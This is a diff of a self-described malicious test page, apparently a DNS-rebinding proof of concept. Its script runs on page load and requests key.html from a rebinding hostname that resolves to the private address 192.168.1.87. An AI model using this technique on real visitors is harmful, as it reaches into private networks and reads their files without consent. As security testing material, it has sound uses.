@@ -5,9 +5,6 @@
 	<body>
 		
 	<div> This is a wannabe malicious-y test page running a script. </div>
-	<script>
-		load();
-	</script>
 	<p id="reply"></p>
 
 	<script>
@@ -34,15 +31,15 @@
 							}
 					};
 
-					//var data = "{}";
 					xhttp.open("GET", "http://a48a1f96.c0a80157.rbndr.us/key.html", true);
-					//xhttp.open("GET", "http://192.168.1.87/key.html", true);
 					xhttp.setRequestHeader("Content-type", "text/plain");
-					//xhttp.send(data);
 					console.log("Sending request!");
 			  		xhttp.send();
 			}
 		}
+
+		load();
 	</script>
+	
 </body>
 </html>
